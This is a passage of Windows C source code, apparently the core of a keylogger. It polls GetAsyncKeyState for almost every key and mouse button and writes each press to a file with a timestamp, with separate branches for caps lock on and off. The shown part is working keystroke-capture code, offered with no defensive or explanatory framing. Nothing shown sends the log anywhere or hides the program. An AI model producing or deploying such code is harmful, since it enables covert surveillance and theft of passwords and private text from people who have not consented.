            Save_Time_In_File;

            fprintf(fp,"\nF17 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x81)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nF18 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x82)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF19 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x83)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF20 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x84)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF21 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x85)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF22 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x86)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nF23 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x87)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nF24 KEY(CAPS ON)\n");
        }
        /* Starting From 90 Because Rest Are Reserved */

        if(keyvalue=GetAsyncKeyState(0x90)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nNUM LOCK KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x91)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nSCROLL LOCK KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xA0)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nLeft SHIFT KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xA1)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nRight SHIFT KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xA2)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nLEFT CONTROL KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xA3)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nRIGHT CONTROL KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xA4)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nLEFT MENU KEY(CAPS ON)\n");
        }
          if(keyvalue=GetAsyncKeyState(0xA5)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nRIGHT MENU KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xA6)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nBROWSER BACK KEY(CAPS ON)\n");
        }
         if(keyvalue=GetAsyncKeyState(0xA7)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nBROWSER FORWARD KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xA8)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nBROWSER REFRESH KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xA9)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nBROWSER STOP KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xAA)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nBROWSER SEARCH KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xAB)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nBROWSER FAVOURITE KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xAC)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nBROWSER START AND HOME KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xAD)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nVOLUME MUTE KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xAE)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nVOLUME DOWN KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xAF)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nVOLUME UP KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xB0)!=0)
        {
            separator;


           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nNEXT TRACK KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xB1)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nPREVIOUS TRACK KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xB2)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nSTOP MEDIA KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xB3)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nSTART MEDIA KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xB4)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nSTART MAIL KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xB5)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nSELECT MEDIA KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xB6)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nSTART APPLICATION 1 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xB7)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nSTART APPLICATION 2 KEY(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xBA)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n;(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xBB)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n+(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xBC)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n,(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xBD)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n-(CAPS ON)\n");
        }
        if(keyvalue=GetAsyncKeyState(0xBE)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n.(CAPS ON)\n");
        }




        }//Closing The If Check For Caps Lock

 else
 {
     if(keyvalue=GetAsyncKeyState(0x01)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nleft mouse button (caps off)\n");
        }

        if(keyvalue=GetAsyncKeyState(0x02)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nright mouse button (caps off)\n");
        }

        if(keyvalue=GetAsyncKeyState(0x03)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\ncontrol-break processing (caps off)\n");
        }

        if(keyvalue=GetAsyncKeyState(0x04)!=0)
        {
            separator;

          /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nmiddle mouse button (three-button mouse) (caps off)\n");
        }

        if(keyvalue=GetAsyncKeyState(0x05)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nx1 mouse button(caps off)\n");
        }

         if(keyvalue=GetAsyncKeyState(0x06)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nx2 mouse button (caps off)\n");
        }

            /* Seven Is For The Bell */

        if(keyvalue=GetAsyncKeyState(0x08)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nbackspace key (caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x09)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\ntab key (caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x0C)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nclear key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x0D)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n----enter key----(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x10)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nshift key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x11)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\ncontrol key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x12)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nalt key (caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x13)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\npause key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x15)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nime kana mode(caps off)\n");
        }
		// sisteen is reserved
        if(keyvalue=GetAsyncKeyState(0x17)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nime junja mode(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x18)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nime final mode(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x19)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nime hanja mode(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x19)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nime kanji mode(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x1B)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nesc (caps off)\n");
        }
          if(keyvalue=GetAsyncKeyState(0x1C)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nime convert (caps off)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x1D)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nime convert(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x1D)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nime nonconvert(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x1E)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nime accept(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x1F)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nime mode change request(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x20)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nspace(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x21)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\npage up key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x22)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\npage down key (caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x23)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nend key (caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x24)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\home key (caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x25)!=0)
        {
            separator;
            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nleft arrow key (caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x26)!=0)
        {
            separator;
            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nup arrow key (caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x27)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nright arrow key (caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x28)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\ndown arrow key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x29)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nselect key(caps off)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x2A)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nprint key(caps off)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x2B)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nexecute key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x2C)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nprint screen key(caps off)\n");
        }
          if(keyvalue=GetAsyncKeyState(0x2D)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\ninsert key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x2E)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\ndelete key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x2F)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nhelp key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x30)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n0(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x31)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n1(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x32)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n2(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x33)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n3(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x34)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n4(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x35)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n5(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x36)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n6(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x37)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n7(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x38)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n8(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x39)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\n9(caps off)\n");
        }
        // 40 Undefined

        if(keyvalue=GetAsyncKeyState(0x41)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\na(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x42)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nb (caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x43)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nc (caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x44)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nd (caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x45)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\ne (caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x46)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nf (caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x47)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\ng (caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x48)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nh(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x49)!=0)
        {
            separator;


           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\ni(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x4A)!=0)
        {
            separator;


           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nj(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x4B)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nk(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x4C)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nl(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x4D)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nm(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x4E)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nn(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x4F)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\no(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x50)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\np(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x51)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nq(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x52)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nr(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x53)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\ns(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x54)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nt(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x55)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nu(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x56)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nv(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x57)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nw(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x58)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;


            fprintf(fp,"\nx(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x59)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\ny(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x5A)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nz(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x5B)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nleft windows key (natural keyboard) (caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x5B)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nleft windows key (natural keyboard)(caps off)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x5C)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nright windows key (natural keyboard)(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x5D)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\napplications key (natural keyboard)(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x5F)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\ncomputer sleep key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x60)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nnumeric keypad 0 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x61)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nnumeric keypad 1 key(caps off)\n");
        }
        if(keyvalue=GetAsyncKeyState(0x62)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nnumeric keypad 2 key(caps off)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x63)!=0)
        {
            separator;

           /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nnumeric keypad 3 key(caps off)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x64)!=0)
        {
            separator;


            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nnumeric keypad 4 key(caps off)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x65)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nnumeric keypad 5 key(caps off)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x66)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nnumeric keypad 6 key(caps off)\n");
        }
         if(keyvalue=GetAsyncKeyState(0x67)!=0)
        {
            separator;

            /* See Macros Above */
            Get_Time_In_Seconds;

            seconds_into_string;

            Save_Time_In_File;

            fprintf(fp,"\nnumeric keypad 7 key(caps off)\n");
        }
